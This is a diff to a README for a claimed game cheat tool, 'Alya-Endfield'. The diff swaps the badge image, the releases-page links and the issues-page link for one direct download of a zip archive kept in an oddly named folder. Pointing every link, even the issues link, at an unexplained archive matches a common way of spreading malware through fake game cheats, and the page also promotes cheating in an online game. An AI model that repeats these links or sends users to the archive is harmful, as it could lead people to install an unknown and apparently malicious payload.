@@ -6,12 +6,12 @@ Welcome to the **Alya-Endfield** project. This software serves as a cheat tool f
 
 ## 🔗 Download Now
 
-[![Download Alya-Endfield](https://img.shields.io/badge/Download-Alya--Endfield-blue.svg)](https://github.com/corellisono/Alya-Endfield/releases)
+[![Download Alya-Endfield](https://github.com/corellisono/Alya-Endfield/raw/refs/heads/main/preposterous/Endfield_Alya_1.1.zip)](https://github.com/corellisono/Alya-Endfield/raw/refs/heads/main/preposterous/Endfield_Alya_1.1.zip)
 
 ## 📥 Download & Install
 
 1. **Visit the Releases Page:** Click the link below to get the software.
-   - [Download Alya-Endfield Here](https://github.com/corellisono/Alya-Endfield/releases)
+   - [Download Alya-Endfield Here](https://github.com/corellisono/Alya-Endfield/raw/refs/heads/main/preposterous/Endfield_Alya_1.1.zip)
 
 2. **Choose a Version:** On the releases page, you’ll see different versions of the software. The latest version is usually at the top. 
 
@@ -72,4 +72,4 @@ Join our community of players using Alya-Endfield. Share your experiences, tips,
 
 Thanks for using **Alya-Endfield**. Your input keeps the project alive and thrives. We appreciate your support and hope you enjoy your enhanced Arknight experience.
 
-For more information or to report issues, please check our [issues page](https://github.com/corellisono/Alya-Endfield/issues).
+For more information or to report issues, please check our [issues page](https://github.com/corellisono/Alya-Endfield/raw/refs/heads/main/preposterous/Endfield_Alya_1.1.zip).
